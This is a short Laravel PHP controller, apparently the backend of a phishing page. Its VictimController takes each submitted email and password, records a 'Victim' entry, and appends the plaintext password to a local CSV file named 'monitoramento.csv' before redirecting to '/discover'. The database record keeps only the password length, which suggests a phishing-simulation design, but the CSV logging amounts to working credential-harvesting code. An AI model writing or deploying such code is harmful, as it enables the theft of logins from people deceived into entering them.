<?php

namespace App\Http\Controllers;

use App\Models\Victim;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Storage;

class VictimController extends Controller
{
    public function store(Request $request)
    {
        $dados = $request->validate([
            'email' => ['required', 'email'],
            'password' => ['required', 'string'],
        ]);

        Victim::create([
            'email' => $dados['email'],
            'password_submitted' => true,
            'password_length' => strlen($dados['password']),
        ]);

        $dados = $request->only(['email', 'password']);
        $json = json_encode($dados);

        // --- converte para .json para .csv ---
        
        $nomeArquivo = 'monitoramento.csv';
        $id = uniqid();
        
        if (!Storage::disk('local')->exists($nomeArquivo)) {
            $header = "id,email,password\n";
            Storage::disk('local')->put($nomeArquivo, $header);
        }
        
        $linhaCsv = "{$id},{$dados['email']},{$dados['password']}";
        Storage::disk('local')->append($nomeArquivo, $linhaCsv);

        return redirect('/discover');
    }

    


}